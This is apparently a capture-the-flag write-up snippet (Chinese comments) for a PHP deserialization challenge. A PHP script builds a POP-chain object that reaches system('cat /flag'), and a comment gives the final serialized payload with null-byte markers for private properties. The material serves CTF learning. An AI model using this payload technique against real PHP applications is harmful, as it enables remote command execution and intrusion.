# 垫刀之路06: pop base mini moe

```php
<?php
class A {
    private $evil="cat /flag";
    private $a;
    function __construct(){
        $this->a=new B();
    }
    //记得把__destruct搞掉，留着会报错，什么“function name must be a string”。反正序列化不记录函数
}
class B {
    private $b="system";
    function __invoke($c) {
        $s = $this->b;
        $s($c);
    }
}
echo serialize(new A());
//打印出来的内容不会包含%00。需要自行加上表示这是一个私有属性。见 https://wiki.wgpsec.org/knowledge/ctf/php-serialize.html
//O:1:"A":2:{s:7:"%00A%00evil";s:9:"cat /flag";s:4:"%00A%00a";O:1:"B":1:{s:4:"%00B%00b";s:6:"system";}}
```